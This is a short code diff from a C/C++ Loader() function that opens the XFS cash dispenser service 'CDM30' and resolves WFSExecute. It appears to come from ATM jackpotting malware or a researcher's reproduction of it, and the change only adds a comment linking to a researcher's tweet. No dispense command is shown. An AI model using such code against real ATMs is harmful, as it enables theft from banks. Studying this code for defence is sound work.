@@ -58,7 +58,7 @@ void Loader()
     WFSVERSION* lpSpi = new WFSVERSION;
     HSERVICE hServ;
     LPSTR lName = new char[6];
-    lName = (LPSTR)"CDM30";
+    lName = (LPSTR)"CDM30"; // https://twitter.com/r3c0nst/status/1234494497486233607
     hRes = wfsopen(lName, NULL, NULL, NULL, WFS_INDEFINITE_WAIT, 0x00010005, lpSrvc, lpSpi, &hServ);
 
     Exec wfsexec = (Exec)GetProcAddress(hDll, "WFSExecute");
